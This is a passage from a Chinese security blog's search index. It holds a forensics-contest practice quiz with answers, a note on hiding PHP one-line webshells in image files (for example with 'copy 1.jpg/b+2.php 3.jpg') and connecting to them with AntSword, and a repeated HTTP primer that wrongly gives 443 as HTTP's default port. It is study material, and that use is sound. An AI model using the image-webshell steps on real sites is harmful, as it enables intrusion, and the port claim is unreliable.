","date":"2023-11-17","objectID":"/port_vulnerabilities/:0:0","series":null,"tags":["web","manual"],"title":"常见端口漏洞总结","uri":"/port_vulnerabilities/#"},{"categories":["Forensics","wp"],"content":"2022盘古石电子取证大赛的样题wp 每道题5分，共计200分 ","date":"2023-11-17","objectID":"/pgs_practice/:0:0","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#"},{"categories":["Forensics","wp"],"content":"\r一、请检查窝点中的手机检材，回答以下问题1、 该OPPO手机的IMEI是： A. 860370043989014,860370049389006 B. 860370049389014,860370049389006 C. 860370049389014,860370043989006 D. 860370049839014,860370049839006 2、 该涉案人所使用的的微信ID和关联的手机号是： A. wxid_rn6kc87f1mb354 16521330311 B. wxid_rn5mjxpw1mb922 17721103461 C. wxid_wi8nf67f1lmd54 15528880561 D. wxid_kshn457f1lm123 15847880501 3、 涉案团伙的最后线 下犯罪窝点地址是： A. 闵行区古美西路86弄44号 B. 田林路1036号科技绿洲三期16号楼101室 C. 上海市合川路科技绿洲3期5-3号楼 D. 闵行区合川路2555号 4、 犯罪团伙所用的诈骗应用apk的sha256值是 A. 71064939606EE601F2F5A888C75F3949CB82A8DF472D15D77EE2A3DF663FC8E9 B. DC0909D078AC1B692836BB0526E52633DDE49D1286631FA0EF9C744925DF545E C. F67F61057828F57EA663CEBEDD638EE9A4BAF36F69DA7E002CBA54C9F8EAAF85 D. 96B1258E64DA18C323DE8ECE0F89D88B0F0B99F459F209B514F7F500D72B7D1B 要从文件系统里面找，然后导出，通过hash计算软件可算出sha256的值 5、 该涉案人手机在3月7日除了上海还可能去过哪个城市？ A. 长春 B. 成都 C. 武汉 D. 北京 6、 该涉案人可能用的输入法是和版本号： A. 10.9.4 B. 8.32.22.2010171749 C. 10.94 D. 8.32.22.201071749 7、 该输入法没有哪项权限： A. 照相 B. 连接网络 C. 修改型号 D. 读取文件 其他三种权限都有 没有修改型号的权限 1.android.permission.WRITE_USER_DICTIONARY允许应用程序向用户词典中写入新词 2.android.permission.WRITE_SYNC_SETTINGS写入Google在线同步设置 3.android.permission.WRITE_SOCIAL_STREAM读取用户的社交信息流 4.android.permission.WRITE_SMS允许程序写短信 5.android.permission.WRITE_SETTINGS允许程序读取或写入系统设置 6.android.permission.WRITE_SECURE_SETTINGS允许应用程序读取或写入安全系统设置 7.android.permission.WRITE_PROFILE允许程序写入个人资料数据 8.com.android.browser.permission.WRITE_HISTORY_BOOKMARKS允许一个应用程序写(但不可读)用户的浏览历史和书签 9.android.permission.WRITE_GSERVICES允许程序修改Google服务地图 10.android.permission.WRITE_EXTERNAL_STORAGE允许程序写入外部存储,如SD卡上写文件 11.android.permission.WRITE_CONTACTS写入联系人,但不可读取 12.android.permission.WRITE_CALL_LOG允许程序写入（但是不能读）用户的联系人数据 13.android.permission.WRITE_CALENDAR允许程序写入日程，但不可读取 14.android.permission.WRITE_APN_SETTINGS允许程序写入网络GPRS接入点设置 15.android.permission.WAKE_LOCK允许程序在手机屏幕关闭后后台进程仍然运行 16.android.permission.VIBRATE允许程序振动 17.android.permission.USE_SIP允许程序使用SIP视频服务 18.android.permission.USE_CREDENTIALS允许程序请求验证从AccountManager 19.android.permission.UPDATE_DEVICE_STATS允许程序更新设备状态 20.com.android.launcher.permission.UNINSTALL_SHORTCUT删除快捷方式 21.android.permission.TRANSMIT_IR允许使用设备的红外发射器，如果可用 22.android.permission.SYSTEM_ALERT_WINDOW允许程序显示系统窗口 23.android.permission.SUBSCRIBED_FEEDS_WRITE允许程序写入或修改订阅内容的数据库 24.android.permission.SUBSCRIBED_FEEDS_READ允许程序访问订阅信息的数据库 22.android.permission.STATUS_BAR允许程序打开、关闭、禁用状态栏 23.android.permission.SIGNAL_PERSISTENT_PROCESSES允许程序发送一个永久的进程信号 24.android.permission.SET_WALLPAPER_HINTS允许程序设置壁纸建议 25.android.permission.SET_WALLPAPER允许程序设置桌面壁纸 26.android.permission.SET_TIME_ZONE允许程序设置系统时区 27.android.permission.SET_TIME允许程序设置系统时间 28.android.permission.SET_PROCESS_LIMIT允许程序设置最大的进程数量的限制 29.android.permission.SET_PREFERRED_APPLICATIONS允许程序设置应用的参数，已不再工作具体查看addPackageToPreferred(String) 介绍 30.android.permission.SET_POINTER_SPEED无法被第三方应用获得，系统权限 31.android.permission.SET_ORIENTATION允许程序设置屏幕方向为横屏或标准方式显示，不用于普通应用 32.android.permission.SET_DEBUG_APP允许程序设置调试程序，一般用于开发 33.android.permission.SET_ANIMATION_SCALE允许程序设置全局动画缩放 34.android.permission.SET_ALWAYS_FINISH允许程序设置程序在后台是否总是退出 36.com.android.alarm.permission.SET_ALARM允许程序设置闹铃提醒 37.android.permission.SET_ACTIVITY_WATCHER允许程序设置Activity观察器一般用于monkey测试 38.android.permission.SEND_SMS允许程序发送短信 39.android.permission.SEND_RESPOND_VIA_MESSAGE允许用户在来电的时候用你的应用进行即时的短信息回复。 40.android.permission.RESTART_PACKAGES允许程序结束任务通过restartPackage(String)方法，该方式将在外来放弃 41.android.permission.REORDER_TASKS允许程序重新排序系统Z轴运行中的任务 42.android.permission.RECORD_AUDIO允许程序录制声音通过手机或耳机的麦克 43.android.permission.RECEIVE_WAP_PUSH允许程序接收WAP PUSH信息 44.android.permission.RECEIVE_SMS允许程序接收短信 45.android.permission.RECEIVE_MMS允许程序接收彩信 46.android.permission.RECEIVE_BOOT_COMPLETED允许程序开机自动运行 47.android.permission.REBOOT允许程序重新启动设备 48.android.permission.READ_USER_DICTIONARY从一个提供器中获取数据，针对对应的提供器，应用程序需要“读访问权限” 49.android.permission.READ_SYNC_STATS允许程序读取同步状态，获得Google在线同步状态 50.android.permission.READ_SYNC_SETTINGS允许程序读取同步设置，读取Google在线同步设置 51.android.permission.READ_SOCIAL_STREAM读取用户的社交信息流 52.android.permission.READ_SMS允许程序读取短信内容 53.android.permissio","date":"2023-11-17","objectID":"/pgs_practice/:0:1","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#一请检查窝点中的手机检材回答以下问题"},{"categories":["Forensics","wp"],"content":"\r二、请检查窝点中的计算机检材，回答以下问题14、 涉案计算机的计算机全名是？ A. DESKTOP-VC69QPB B. DESKTOP-KDN38R5 C. DESKTOP-SLU384N D. DESKTOP-I92E87D 15、 涉案计算机有效账户最后一次登录时间是？ A. 2022-03-15 09:43:04 +08 B. 2022-03-15 09:43:04 +00 C. 2022-03-15 17:43:04 +08 D. 2022-03-15 17:48:04 +00 16、 涉案计算机登录次数最多的账户是什么？登录了多少次？ A. admin 16 B. admin 19 C. administrator 16 D. administrator 19 17、 涉案计算机是否连接过SanDisk优盘，该优盘的序列号是什么？ A. 4C530001180221100781 B. 4C530001180221109491 C. 5D7E0001180221100781 D. 5D7E 0001180221109491 18、 涉案计算机以太网的Ip地址是？ A. 192.168.1.100 B. 192.168.1.101 C. 172.168.1.100 D. 172.168.1.101 19、 涉案Windows计算机通过浏览器是否下载过哪个软件？ A. QQ B. Navicat C. Clash D. wireshark 20、 嫌疑人使用navicat远程连接数据的IP是？ A. 45.77.15.219 B. 45.77.16.229 C. 35.66.15.219 D. 35.66.16.229 21、 涉案计算机是否存在加密分区，采用了什么加密方式？ A. Bitlocker B. TrueCrypt C. VeraCrypt D. CnCrypt 22、 涉案计算机加密分区里面word文档文件最后访问时间是什么? A. 2022-03-14 19：14：45 +08 B. 2022-03-14 19：14：45 +00 C. 2022-03-14 19：10：53 +08 D. 2022-03-14 19：10：53 +00 通过恢复秘钥进行解密 23、 涉案计算机加密分区中的txt文件SHA256值为？ 计算hash值 A.da54693b5f04ea703e23065b53d01d89ca36e0444dee62ba01622e6d186e4712 B.fa7a3b601325cfe85a9d6fff6514804d06754795175c87c3af162eac7dcf693a C.972403b4b8fdfc211d5a14178be7e02e792cbe6a7bd6ff827ebb2c8909f4e2b8 D.b7254757595ce0228801bd53417895c2b6f28781d98bec8d854f4772c06aea29 24、 涉案计算机使用的远程连接工具ToDesk的版本是？ A. 4.2.6.03021556 B. 12.5.1.44969 C. 14.28.2935.2 D. 11.0.61030 25、 哪个设备的IP曾经通过向日葵连接到本地计算机？ A. 11.91.214.117 B. 116.246.0.90 C. 58.244.39.225 D. 10.91.215.14 26、 嫌疑人使用的VPN使用了哪种加密算法 A. DES-128-CFB B. AES-256-cfb C. MD5 D. SHA 27、 以下哪个地址不会被自动识别走代理通道？ A. carfax.com/index.html B. api.expekt.com C. huluim.com/login D. api.dns100.com 使用盘古的计算机仿真软件打开镜像，去查看VPN软件Shadowsocket的文件，里面的pac.txt里有代理规则 28、 以下哪个IP会被代理软件识别为国内IP段进行直连。 A. 1.16.0.1 B. 1.205.0.1 C. 35.2.0.1 D. 56.11.0.1 **使用仿真系统进入，检索shadowsockets的**chn_ip.txt文件检索这4个选项 因为是ip段所以我在检索1.204时发现B. 1.205.0.1在ip段1.204.0.0—-1.207.255.255里面 29、 查看涉案计算机系统日志，判断该涉案计算机最后一次刷新时区信息是什么时间？ A. 2022-3-17 9:59:14 B. 2022-3-16 10:02:13 C. 2022-3-15 12:54:44 D. 2022-3-17 10:06:38 在仿真镜像后win+R输入eventvwr.msc,查看系统（但是里面有你仿真时的时间信息，需甄别） ","date":"2023-11-17","objectID":"/pgs_practice/:0:2","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#二请检查窝点中的计算机检材回答以下问题"},{"categories":["Forensics","wp"],"content":"\r三、请检查窝点中的服务器检材，回答以下问题30、 Liunx服务器的系统内核版本 A. 3.10.0-1127.el7.x86 B. 3.10.0-1127.el7.x86_64 C. 3.11.0-1127.el7.x86_64 D. 3.11.0-1127.el7.x86 31、 该涉案服务器宝塔面板的访问限制域名是什么？ A. h1.jsgjzfx.cn B. gjjszfx.cn C. h5.jsgjzfx.cn D. h5. gjjszfx.cn 32、 涉诈网站目录中数据库连接配置文件的路径 A./www/backup/file_history/www/wwwroot/h1.jsgjzfx.cn/Application/config.php B./www/backup/file_history/www/wwwroot/h1.jsgjzfx.cn/Application/Home/View/Qts/User/config.php C./www/wwwroot/h1.jsgjzfx.cn/Application/Common/Conf/config.php D./www/wwwroot/config.php 接着查看/www/wwwroot/h1.jsgjzfx.cn/Application/Common/Conf/config.php 33、 登录涉案网站后台，显示有多少用户 A. 922 B. 921 C. 920 D. 919 34、 受害人“好大哥”在涉案网站2022-03-04 14:39:26 充值金额状态 A.重置失败 B.交易中 C.充值完成 D.已充值 登录网站后台检索充值记录，查询2022-03-04的充值记录可以发现目标 35、 涉案网站总成功提现金额 A. 33808154.28 B. 338081541.28 C. 338081653.97 D. 33808165.97 登录网站后台检索提现申请。检索时间段（尽量往后时间），发现成功提现总金额为 338081541.28 36、 涉案网站的数据库中管理员登录次数最多的ip是哪个 A.112.114.103.205 B.13.124.79.70 C.43.254.219.161 D.14.204.0.87 打开数据库里的wp_login_log发现登录ip最多的是14.204.0.87 37、 涉案网站数据库中平仓时间在2020年1月1日-2020年12月31日的实盘交易订单数量 A. 5159 B. 2567 C. 3536 D. 4684 进入网站数据库，使用sql语句进行检索 38、 涉案网站数据库中购买\"以太坊\"交易产品的用户绑定银行名称为\"中国工商银行\"的用户有多少 A. 4 B. 3 C. 5 D. 7 sql语句： SELECT COUNT(DISTINCT o.uid) from (SELECT * FROM wp_bankinfo WHERE bankname = '中国工商银行') as b,(SELECT uid FROM wp_order WHERE option_name = '以太坊') AS o WHERE b.uid = o.uid ","date":"2023-11-17","objectID":"/pgs_practice/:0:3","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#三请检查窝点中的服务器检材回答以下问题"},{"categories":["Forensics","wp"],"content":"\r四、请检查窝点中的路由器检材导出报告，回答以下问题39、 该窝点中使用路由器的WiFi密码是？ A. TPGuest_8D70 B. admin123 C. TPLink_TL D. 688561qi 40、 在该窝点中勘验时分配IP为192.168.1.102的设备mac地址是？ A. 84-a9-38-28-f5-95 B. 6c-4b-90-8c-87-8c C. 80-b6-55-26-f4-4e D. 00-25-90-83-af-f2 ","date":"2023-11-17","objectID":"/pgs_practice/:0:4","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#四请检查窝点中的路由器检材导出报告回答以下问题"},{"categories":["notes"],"content":"一句话木马de一些姿势 ","date":"2022-11-17","objectID":"/word_trojan/:0:0","series":null,"tags":["notes"],"title":"一句话木马","uri":"/word_trojan/#"},{"categories":["notes"],"content":"\r简介图片马:就是在图片中隐藏一句话木马。利用.htaccess等解析图片为PHP或者asp文件。达到执行图片内代码目的 注意： 单纯的图片马并不能直接和蚁剑连接， 因为该文件依然是以image格式进行解析， 只有利用文件包含漏洞，才能成功利用该木马 所谓文件包含漏洞，是指在代码中引入其他文件作为php文件执行时，未对文件进行严格过滤，导致用户指定任意文件，都作为php文件解析执行。 ","date":"2022-11-17","objectID":"/word_trojan/:0:1","series":null,"tags":["notes"],"title":"一句话木马","uri":"/word_trojan/#简介"},{"categories":["notes"],"content":"\r1.文本方式打开图片直接粘贴一句话木马将一个图片以文本格式打开(这里用的notepad++.以记事本方式打开修改也能连接成功,不过修改后图片无法正常显示了), 后面粘贴上一句话木马 上传图片 连接蚁剑,嗯,很好,连接成功 ","date":"2022-11-17","objectID":"/word_trojan/:0:2","series":null,"tags":["notes"],"title":"一句话木马","uri":"/word_trojan/#1文本方式打开图片直接粘贴一句话木马"},{"categories":["notes"],"content":"\r2.cmd命令行执行cmd中 copy 1.jpg/b+2.php 3.jpg /b是二进制形式打开 /a是ascii方式打开 在windows的cmd中执行 可以看到末尾已经有一句话木马了 上传之后连接试试,成功 ","date":"2022-11-17","objectID":"/word_trojan/:0:3","series":null,"tags":["notes"],"title":"一句话木马","uri":"/word_trojan/#2cmd命令行执行"},{"categories":["notes"],"content":"\r3.用16进制编辑器打开,末尾添加用winhex打开图片,添加一句话木马 上传,连接成功 ","date":"2022-11-17","objectID":"/word_trojan/:0:4","series":null,"tags":["notes"],"title":"一句话木马","uri":"/word_trojan/#3用16进制编辑器打开末尾添加"},{"categories":["notes"],"content":"\r4.用PhotoShop制作先打开图片 点击文件-\u003e文件简介 添加木马 上传,连接成功 ","date":"2022-11-17","objectID":"/word_trojan/:0:5","series":null,"tags":["notes"],"title":"一句话木马","uri":"/word_trojan/#4用photoshop制作"},{"categories":["notes"],"content":"第一次CTF基础学习笔记 Hello，everyone！ I’m new in town! ","date":"2022-09-20","objectID":"/web_base-2022.9/:0:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#"},{"categories":["notes"],"content":"\rHTTP基础","date":"2022-09-20","objectID":"/web_base-2022.9/:1:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http基础"},{"categories":["notes"],"content":"\r◎HTTP协议解析HTT(HyperText Transfer Protoclo)即超文本传输协议，详细规定了浏览器和万维网服务器之间互相通信的规则，是万维网交换信息的基础。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http协议解析"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http请求"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http之url"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 